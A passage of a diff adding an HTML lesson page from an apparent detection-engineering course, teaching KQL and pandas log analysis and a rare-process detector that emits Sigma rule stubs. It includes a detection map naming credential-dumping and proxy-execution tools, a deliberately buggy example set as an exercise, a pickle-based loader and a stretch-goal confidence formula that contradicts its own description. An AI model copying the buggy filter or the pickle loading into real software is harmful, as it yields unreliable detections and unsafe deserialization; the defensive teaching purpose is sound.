+# SLOW: filter after join
+def slow_query(df_events: pd.DataFrame, df_users: pd.DataFrame) -&gt; pd.DataFrame:
+    merged = df_events.merge(df_users, on=&quot;Account&quot;)
+    return merged[merged[&quot;EventID&quot;] == 4624]
+
+# FAST: filter before join
+def fast_query(df_events: pd.DataFrame, df_users: pd.DataFrame) -&gt; pd.DataFrame:
+    filtered = df_events[df_events[&quot;EventID&quot;] == 4624]   # filter first
+    return filtered.merge(df_users, on=&quot;Account&quot;)         # join smaller dataset
+
+# SLOW: regex when not needed
+def slow_contains(df: pd.DataFrame) -&gt; pd.DataFrame:
+    return df[df[&quot;CommandLine&quot;].str.contains(r&quot;powershell&quot;, regex=True, na=False)]
+
+# FAST: str.contains with regex=False
+def fast_contains(df: pd.DataFrame) -&gt; pd.DataFrame:
+    return df[df[&quot;CommandLine&quot;].str.contains(&quot;powershell&quot;, regex=False, na=False)]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Given two DataFrames (1000-row events, 50-row user lookup), write both slow and fast versions of a join query (filter EventID 4625, join on Account). Use <code>%timeit</code> logic by wrapping in <code>time.perf_counter()</code> and return <code>{&quot;slow_ms&quot;: N, &quot;fast_ms&quot;: M, &quot;speedup_factor&quot;: N/M}</code>. Show the speedup is meaningful.
+Expected output: dict showing fast version is faster; speedup_factor &gt; 1.0</p>
+<hr />
+<h3>Concept 2 — Window Functions in KQL</h3>
+<p>Window functions compute values over a sliding or expanding window of rows, ordered by time. They're essential for detection patterns that depend on context around an event.</p>
+<p>KQL window functions:</p>
+<ul>
+<li><code>prev(field)</code> — value of field in the previous row (same partition)</li>
+<li><code>next(field)</code> — value of field in the next row</li>
+<li><code>row_number()</code> — sequential row number within partition</li>
+<li><code>series_stats()</code> — compute statistics over a time series array</li>
+<li><code>make_list()</code> + <code>mvexpand</code> — aggregate then expand arrays</li>
+</ul>
+<p>Partitioning by <code>Account</code> or <code>Computer</code> with <code>order by TimeGenerated</code> enables per-entity analysis.</p>
+<p><strong>Example:</strong></p>
+<pre><code>// Detect rapid account hopping: same IP logging in as multiple accounts
+SecurityEvent
+| where EventID == 4624
+| where TimeGenerated &gt; ago(1h)
+| sort by IpAddress, TimeGenerated asc
+| extend prev_account = prev(Account, 1, &quot;&quot;)
+| where Account != prev_account and IpAddress == prev(IpAddress, 1, &quot;&quot;)
+| summarize unique_accounts = dcount(Account), account_list = make_list(Account) by IpAddress
+| where unique_accounts &gt; 3
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def detect_account_hopping(df: pd.DataFrame, window_hours: int = 1, threshold: int = 3) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;Find IPs that authenticated as multiple different accounts within the window.&quot;&quot;&quot;
+    cutoff = df[&quot;TimeGenerated&quot;].max() - pd.Timedelta(hours=window_hours)
+    recent = df[(df[&quot;EventID&quot;] == 4624) &amp; (df[&quot;TimeGenerated&quot;] &gt;= cutoff)]
+    
+    result = (
+        recent.groupby(&quot;IpAddress&quot;)
+        .agg(unique_accounts=(&quot;Account&quot;, &quot;nunique&quot;), account_list=(&quot;Account&quot;, list))
+        .reset_index()
+    )
+    return result[result[&quot;unique_accounts&quot;] &gt; threshold].sort_values(&quot;unique_accounts&quot;, ascending=False)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>sliding_window_rate(df: pd.DataFrame, event_id: int, window_minutes: int, step_minutes: int) -&gt; pd.DataFrame</code> that computes event count in a sliding window (not just fixed bins). For each time step, count events in [t - window, t]. Return a time series DataFrame with columns: timestamp, event_count, rolling_mean_3periods, spike (bool: count &gt; 2x rolling_mean).
+Expected output: time series with spike column; test data should show at least one spike if events are clustered</p>
+<hr />
+<h3>Concept 3 — Aggregation Patterns for Detection</h3>
+<p>Advanced detection queries use multi-level aggregation: first aggregate individual events into summaries, then aggregate summaries into alert candidates.</p>
+<p>Patterns:</p>
+<ul>
+<li><strong>Count-based threshold</strong>: <code>count() by Account | where count_ &gt; 10</code></li>
+<li><strong>Ratio-based</strong>: failed/(failed+success) &gt; 0.8 in a window = credential stuffing</li>
+<li><strong>Spread-based</strong>: distinct destinations &gt; N = scanning</li>
+<li><strong>Sequence-based</strong>: requires explicit ordering and lag/lead joins</li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def logon_ratio_analysis(df: pd.DataFrame, window_hours: int = 1) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;
+    Compute failure ratio per account per hour.
+    High failure ratio with at least one success = likely successful brute force.
+    &quot;&quot;&quot;
+    cutoff = df[&quot;TimeGenerated&quot;].max() - pd.Timedelta(hours=window_hours)
+    recent = df[df[&quot;TimeGenerated&quot;] &gt;= cutoff &amp; df[&quot;EventID&quot;].isin([4624, 4625])].copy()
+    recent[&quot;hour&quot;] = recent[&quot;TimeGenerated&quot;].dt.floor(&quot;h&quot;)
+    
+    agg = recent.groupby([&quot;Account&quot;, &quot;hour&quot;, &quot;EventID&quot;]).size().unstack(fill_value=0).reset_index()
+    agg.columns.name = None
+    agg = agg.rename(columns={4624: &quot;success_count&quot;, 4625: &quot;failure_count&quot;})
+    
+    total = agg[&quot;success_count&quot;] + agg[&quot;failure_count&quot;]
+    agg[&quot;failure_ratio&quot;] = agg[&quot;failure_count&quot;] / total.replace(0, 1)
+    
+    return agg[
+        (agg[&quot;failure_ratio&quot;] &gt; 0.8) &amp; (agg[&quot;failure_count&quot;] &gt; 5) &amp; (agg[&quot;success_count&quot;] &gt; 0)
+    ].sort_values(&quot;failure_ratio&quot;, ascending=False)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Fix the bug in <code>logon_ratio_analysis</code> (the <code>&amp;</code> operator precedence issue with <code>.isin</code> and the cutoff filter), then write <code>scanning_detector(df: pd.DataFrame, event_id: int, dest_field: str, threshold: int) -&gt; pd.DataFrame</code> that finds source IPs contacting more than <code>threshold</code> distinct destinations in 10-minute windows. Return: source_ip, window, distinct_dest_count, dest_sample (first 5 destinations).
+Expected output: DataFrame of scanning candidates; the bug fix should be explained in a comment</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can explain complex KQL queries including window functions to analysts who are less experienced with the syntax.
+<strong>Threat:</strong> Analysts who don't understand the queries they run may misinterpret results — treating false positives as confirmed attacks.
+<strong>Opportunity:</strong> Use an LLM as a &quot;query explainer&quot; — paste a complex detection query and ask for a plain-English explanation and example scenario.
+<strong>Prompt to try:</strong> <code>&quot;Explain this KQL query step by step to a junior analyst who knows basic SQL but not KQL. For each operator, explain what it does in SQL terms. Then describe a specific attack scenario that would cause this query to fire and one scenario that would NOT fire it. Keep the explanation under 200 words.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — The Rare Process Detector (Royal Road Build)</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="11-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=MRszWn0ZGho" target="_blank" rel="noopener"><b>Detecting the Unusual: Elastic Stack Machine Learning for Log Analysis</b><small>Official Elastic Community</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=behavioral%20analytics%20rare%20event%20detection%20machine%20learning%20endpoint%20security" target="_blank" rel="noopener">behavioral analytics rare event detection machine learning endpoint security</a></p></div>
+<hr />
+<h3>Concept 1 — Designing the Full Detector</h3>
+<p>The W11 Royal Road builds a complete rare process behavioral detector. The design brings together:</p>
+<ul>
+<li><strong>Data layer</strong>: W08 Parquet dataset (source events)</li>
+<li><strong>Baseline layer</strong>: frequency model per (process_name, parent_name, host) triple</li>
+<li><strong>Detection layer</strong>: rare + new + spike detection</li>
+<li><strong>Enrichment layer</strong>: risk scoring + entity timeline</li>
+<li><strong>Output layer</strong>: CSV/JSON alert file + summary statistics</li>
+</ul>
+<p>The detector runs in two modes:</p>
+<ul>
+<li><strong>Training mode</strong>: ingest N days of data → build baseline → serialize to file</li>
+<li><strong>Detection mode</strong>: ingest current day events → compare against baseline → output alerts</li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import json
+import pickle
+from pathlib import Path
+
+class RareProcessDetector:
+    def __init__(self, rarity_threshold: float = 0.05):
+        self.rarity_threshold = rarity_threshold
+        self.baseline: pd.DataFrame = pd.DataFrame()
+        self.known_processes: set[str] = set()
+    
+    def train(self, df: pd.DataFrame) -&gt; None:
+        self.baseline = build_process_baseline(df)
+        self.known_processes = set(self.baseline[&quot;process_name&quot;].tolist())
+        rare_cutoff = self.baseline[&quot;total_occurrences&quot;].quantile(self.rarity_threshold)
+        self.rare_processes = set(
+            self.baseline[self.baseline[&quot;total_occurrences&quot;] &lt;= rare_cutoff][&quot;process_name&quot;].tolist()
+        )
+    
+    def detect(self, current_df: pd.DataFrame) -&gt; pd.DataFrame:
+        if self.baseline.empty:
+            raise RuntimeError(&quot;Detector not trained. Call train() first.&quot;)
+        return rare_process_detector(self.baseline, current_df, self.rarity_threshold)
+    
+    def save(self, path: str) -&gt; None:
+        with open(path, &quot;wb&quot;) as f:
+            pickle.dump(self, f)
+    
+    @classmethod
+    def load(cls, path: str) -&gt; &quot;RareProcessDetector&quot;:
+        with open(path, &quot;rb&quot;) as f:
+            return pickle.load(f)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Instantiate <code>RareProcessDetector</code>, train it on the first 80% of the W08 Sysmon dataset rows, run detection on the remaining 20% plus 3 injected synthetic events (new process names). Verify: (1) synthetic events appear in alerts, (2) <code>detector.known_processes</code> is populated, (3) serialization round-trip works (save + load + detect again produces same results).
+Expected output: alerts DataFrame with synthetic events; save/load cycle preserves detector state</p>
+<hr />
+<h3>Concept 2 — Alert Enrichment and Output</h3>
+<p>Raw alerts from the detector need enrichment before they're actionable: add risk scores, attach parent context, link to MITRE ATT&amp;CK, and format for analyst review.</p>
+<p>Alert output schema:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>@dataclass
+class ProcessAlert:
+    alert_id: str
+    timestamp: str
+    detection_reason: str   # &quot;new_process_never_seen&quot; | &quot;rare_process_in_baseline&quot;
+    process_name: str
+    command_line: str
+    parent_name: str
+    user: str
+    host: str
+    risk_score: int
+    mitre_technique: str
+    recommended_action: str
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import uuid
+
+PROCESS_TECHNIQUE_MAP = {
+    &quot;mimikatz.exe&quot;: (&quot;T1003.001&quot;, &quot;Credential Dumping - LSASS&quot;),
+    &quot;certutil.exe&quot;: (&quot;T1105&quot;, &quot;Ingress Tool Transfer&quot;),
+    &quot;mshta.exe&quot;: (&quot;T1218.005&quot;, &quot;Signed Binary Proxy - MSHTA&quot;),
+    &quot;regsvr32.exe&quot;: (&quot;T1218.010&quot;, &quot;Signed Binary Proxy - Regsvr32&quot;),
+}
+
+def enrich_alert(raw_alert: dict) -&gt; dict:
+    pname = raw_alert.get(&quot;process_name&quot;, &quot;&quot;)
+    technique_id, technique_name = PROCESS_TECHNIQUE_MAP.get(pname, (&quot;T1059&quot;, &quot;Command and Scripting&quot;))
+    
+    return {
+        **raw_alert,
+        &quot;alert_id&quot;: str(uuid.uuid4()),
+        &quot;mitre_technique&quot;: technique_id,
+        &quot;mitre_name&quot;: technique_name,
+        &quot;risk_score&quot;: 8 if raw_alert.get(&quot;detection_reason&quot;) == &quot;new_process_never_seen&quot; else 5,
+        &quot;recommended_action&quot;: &quot;Investigate command line and parent process context. Check process hash against threat intel.&quot;,
+    }
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>format_alert_report(alerts: list[dict], output_path: str) -&gt; None</code> that enriches each alert using <code>enrich_alert</code>, deduplicates by (process_name, command_line), writes to a JSON file, and prints a summary: total alerts, by detection_reason, by risk_score bucket (&gt;=8 = HIGH, 5-7 = MEDIUM, &lt;5 = LOW).
+Expected output: JSON file written; console summary with alert counts by severity</p>
+<hr />
+<h3>Concept 3 — Integrating with the Detection Pipeline</h3>
+<p>The rare process detector integrates with the CI/CD pipeline from W10. New process signatures can automatically generate Sigma rule stubs for analyst review.</p>
+<p>Integration points:</p>
+<ul>
+<li><strong>W08</strong>: reads Parquet dataset</li>
+<li><strong>W09</strong>: flagged processes become new Sigma rule candidates</li>
+<li><strong>W10</strong>: rule stubs enter the CI pipeline for validation and deployment</li>
+<li><strong>W07</strong>: enrichment can JOIN against the IOC database to check known-bad hashes</li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def generate_sigma_stub_from_alert(alert: dict) -&gt; str:
+    &quot;&quot;&quot;Generate a Sigma rule skeleton from a rare process alert.&quot;&quot;&quot;
+    import yaml
+    import uuid
+    
+    process = alert.get(&quot;process_name&quot;, &quot;unknown.exe&quot;)
+    technique = alert.get(&quot;mitre_technique&quot;, &quot;T1059&quot;)
+    
+    rule = {
+        &quot;title&quot;: f&quot;Rare Process Execution - {process}&quot;,
+        &quot;id&quot;: str(uuid.uuid4()),
+        &quot;status&quot;: &quot;experimental&quot;,
+        &quot;description&quot;: f&quot;Detects execution of {process}, identified as rare via behavioral baseline analysis.&quot;,
+        &quot;references&quot;: [f&quot;https://attack.mitre.org/techniques/{technique}/&quot;],
+        &quot;author&quot;: &quot;Detection Pipeline (auto-generated)&quot;,
+        &quot;date&quot;: &quot;2024/03/15&quot;,
+        &quot;tags&quot;: [f&quot;attack.{technique.lower().replace(&#x27;.&#x27;, &#x27;_&#x27;)}&quot;],
+        &quot;logsource&quot;: {&quot;category&quot;: &quot;process_creation&quot;, &quot;product&quot;: &quot;windows&quot;},
+        &quot;detection&quot;: {
+            &quot;selection&quot;: {
+                &quot;Image|endswith&quot;: f&quot;\\{process}&quot;,
+            },
+            &quot;condition&quot;: &quot;selection&quot;,
+        },
+        &quot;falsepositives&quot;: [&quot;Security testing&quot;, &quot;Unknown — requires analyst review&quot;],
+        &quot;level&quot;: &quot;medium&quot;,
+    }
+    return yaml.dump(rule, default_flow_style=False)
+
+def run_full_integration(
+    dataset_path: str,
+    ioc_db_path: str,
+    rules_output_dir: str,
+) -&gt; dict:
+    &quot;&quot;&quot;Full pipeline: detect → enrich → generate stubs.&quot;&quot;&quot;
+    df = pd.read_parquet(dataset_path)
+    
+    detector = RareProcessDetector(rarity_threshold=0.05)
+    split = int(len(df) * 0.8)
+    detector.train(df.iloc[:split])
+    alerts_df = detector.detect(df.iloc[split:])
+    
+    if alerts_df.empty:
+        return {&quot;alerts&quot;: 0, &quot;stubs_generated&quot;: 0}
+    
+    alerts = [enrich_alert(row.to_dict()) for _, row in alerts_df.iterrows()]
+    
+    stubs = []
+    output = Path(rules_output_dir)
+    output.mkdir(exist_ok=True)
+    for alert in alerts[:5]:  # cap at 5 to avoid flooding the rule backlog
+        stub = generate_sigma_stub_from_alert(alert)
+        stub_path = output / f&quot;auto_{alert[&#x27;process_name&#x27;].replace(&#x27;.&#x27;, &#x27;_&#x27;)}.yml&quot;
+        stub_path.write_text(stub)
+        stubs.append(str(stub_path))
+    
+    return {&quot;alerts&quot;: len(alerts), &quot;stubs_generated&quot;: len(stubs), &quot;stub_files&quot;: stubs}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a <code>__main__</code> block that runs <code>run_full_integration</code> on a simulated dataset (build the dataset inline using <code>SYSMON_SAMPLE</code> from W08, extended with 5 new synthetic records). Print: number of alerts, number of stubs generated, first stub's YAML content. Handle the case where the dataset has fewer than 10 records gracefully.
+Expected output: integration summary printed; at least one Sigma stub YAML printed to stdout</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can triage rare process alerts by searching their knowledge base for known-malicious or known-legitimate uses of a process name.
+<strong>Threat:</strong> LLMs can be fooled into classifying a malicious process as benign if its name resembles a legitimate tool — reinforcing the typosquatting attack.
+<strong>Opportunity:</strong> Use an LLM as a first-pass triage tool: &quot;Is svchost0.exe a known-malicious process? What does the presence of this process in a Windows environment usually indicate?&quot;
+<strong>Prompt to try:</strong> <code>&quot;A rare process detection fired for 'svchost0.exe' launched by 'powershell.exe' with command line 'svchost0.exe -install'. Triage this alert: (1) is this process name associated with known malware families, (2) is this parent-child combination suspicious, (3) what would you check next in the investigation, (4) assign a severity level (Low/Medium/High/Critical) with justification.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 11</h2>
+<p><strong>Task:</strong> Build and validate a complete rare process behavioral detector that identifies process executions anomalous relative to a historical baseline.
+<strong>Builds on:</strong> W08 Parquet dataset (training data) + W09 detection rules (sigma stubs auto-generated) + W10 CI pipeline (stubs enter the validation pipeline)
+<strong>Deliverable:</strong> <code>behavioral/rare_process_detector.py</code> — a standalone Python module containing:</p>
+<ul>
+<li><code>RareProcessDetector</code> class with <code>train()</code>, <code>detect()</code>, <code>save()</code>, <code>load()</code> methods</li>
+<li><code>enrich_alert()</code> function</li>
+<li><code>generate_sigma_stub_from_alert()</code> function</li>
+<li><code>run_full_integration()</code> entrypoint</li>
+<li><code>__main__</code> block that runs on the W08 dataset and prints a summary</li>
+</ul>
+<p>Script must be runnable standalone: <code>python rare_process_detector.py</code>
+Expected output when run: &quot;Training on N events... Detected M rare processes... Generated K Sigma stubs&quot;</p>
+<p><strong>Stretch goal:</strong> Add a confidence score to each alert: <code>confidence = min(1.0, occurrences_in_baseline / 100)</code> — processes with zero baseline occurrences get confidence=1.0 (highest confidence it's new). Export alerts as both JSON and CSV. Add a <code>--mode train|detect</code> CLI flag using <code>argparse</code>.</p>
+<div class="pager"><a class="btn ghost" href="week-10.html">&larr; Week 10</a><a class="btn ghost" href="week-12.html">Week 12 &rarr;</a></div>
+</main></body></html>
